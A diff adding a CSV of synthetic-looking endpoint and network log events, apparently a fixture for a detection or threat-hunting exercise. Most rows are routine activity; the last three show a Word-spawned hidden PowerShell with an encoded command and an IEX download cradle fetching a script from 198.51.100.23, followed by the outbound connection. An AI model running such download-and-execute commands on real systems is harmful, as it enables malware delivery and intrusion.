@@ -1,0 +1,51 @@
+timestamp,username,source_ip,destination_ip,destination_port,event_type,action,status,hostname,process,command_line,file_hash,message
+2026-09-14 08:37:37,alice,10.0.1.21,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:43:18,dave,10.0.1.24,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:48:18,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 08:50:53,carol,10.0.1.23,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 08:56:55,bob,10.0.1.22,10.0.0.10,,LOGIN,authentication,FAILED,SRV-APP01,,,,Invalid credentials
+2026-09-14 08:57:24,bob,10.0.1.22,10.0.0.10,,LOGIN,authentication,SUCCESS,SRV-APP01,,,,Interactive logon
+2026-09-14 09:10:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,chrome.exe,,,chrome.exe started
+2026-09-14 09:11:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,excel.exe,,,excel.exe started
+2026-09-14 09:12:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,outlook.exe,,,outlook.exe started
+2026-09-14 09:13:37,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 09:24:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 09:39:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,winword.exe,,,winword.exe started
+2026-09-14 09:44:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 09:46:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,outlook.exe,,,outlook.exe started
+2026-09-14 09:54:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,winword.exe,,,winword.exe started
+2026-09-14 10:01:37,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:06:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,winword.exe,,,winword.exe started
+2026-09-14 10:13:53,carol,10.0.1.23,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-CAROL,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:17:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,excel.exe,,,excel.exe started
+2026-09-14 10:25:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:27:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,winword.exe,,,winword.exe started
+2026-09-14 10:32:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,winword.exe,,,winword.exe started
+2026-09-14 10:34:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,winword.exe,,,winword.exe started
+2026-09-14 10:36:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 10:44:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,winword.exe,,,winword.exe started
+2026-09-14 10:45:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,excel.exe,,,excel.exe started
+2026-09-14 10:56:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,teams.exe,,,teams.exe started
+2026-09-14 11:01:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,excel.exe,,,excel.exe started
+2026-09-14 11:04:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,outlook.exe,,,outlook.exe started
+2026-09-14 11:07:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,outlook.exe,,,outlook.exe started
+2026-09-14 11:23:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,excel.exe,,,excel.exe started
+2026-09-14 11:24:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,winword.exe,,,winword.exe started
+2026-09-14 11:26:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,teams.exe,,,teams.exe started
+2026-09-14 11:31:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 11:51:37,alice,10.0.1.21,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-ALICE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 11:53:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,chrome.exe,,,chrome.exe started
+2026-09-14 11:58:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,winword.exe,,,winword.exe started
+2026-09-14 12:02:18,dave,10.0.1.24,,,PROCESS,process_start,EXECUTED,WS-DAVE,teams.exe,,,teams.exe started
+2026-09-14 12:02:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,winword.exe,,,winword.exe started
+2026-09-14 12:03:37,alice,10.0.1.21,,,PROCESS,process_start,EXECUTED,WS-ALICE,chrome.exe,,,chrome.exe started
+2026-09-14 12:05:18,dave,10.0.1.24,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-DAVE,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 12:30:53,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,outlook.exe,,,outlook.exe started
+2026-09-14 12:31:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,teams.exe,,,teams.exe started
+2026-09-14 12:35:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 12:48:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:11:24,bob,10.0.1.22,142.250.183.14,443,NETWORK,connection,ALLOWED,WS-BOB,chrome.exe,,,Outbound HTTPS connection
+2026-09-14 13:50:24,bob,10.0.1.22,,,PROCESS,process_start,EXECUTED,WS-BOB,outlook.exe,,,outlook.exe started
+2026-09-14 14:22:03,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAaQBtAHUAbABhAHQAZQBkACAAYgBlAG4AaQBnAG4AIABwAGEAeQBsAG8AYQBkACcA,,Parent process: winword.exe
+2026-09-14 14:23:10,carol,10.0.1.23,,,PROCESS,process_start,EXECUTED,WS-CAROL,powershell.exe,"powershell.exe -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')""",,Parent process: winword.exe
+2026-09-14 14:24:02,carol,10.0.1.23,198.51.100.23,80,NETWORK,connection,ALLOWED,WS-CAROL,powershell.exe,,,Outbound HTTP connection
